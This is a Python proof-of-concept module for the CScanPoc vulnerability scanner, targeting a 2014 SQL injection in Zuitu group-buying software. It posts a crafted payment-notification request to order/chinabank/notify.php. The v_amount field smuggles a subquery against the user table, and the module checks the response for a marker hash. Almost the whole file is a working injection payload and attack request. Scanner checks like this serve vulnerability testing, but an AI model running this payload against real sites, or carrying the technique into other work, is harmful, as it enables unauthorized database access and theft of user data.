# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'Zuitu_0001' # 平台漏洞编号，留空
    name = '最土团购 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-09-09'  # 漏洞公布时间
    desc = '''
        最土团购，在order/chinabank/notify.php中
        过滤不全导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1764/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zuitu(最土团购)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '43b7a78f-2216-484d-834e-197b8d1efa6d'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/order/chinabank/notify.php'
            data = "V_oid=charge-673-1-5&v_pstatus=20&v_amount=10,email=(select md5(c) from (select * from user where id=1) xx) where mobile-13800138000#&v_md5str=A92A9CD032695DB1BBOFAAOA56915AE2"
            url = self.target + payload
            r = requests.post(url, data=data)
            
            if '4a8a08f09d37b73795649038408b5f33' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()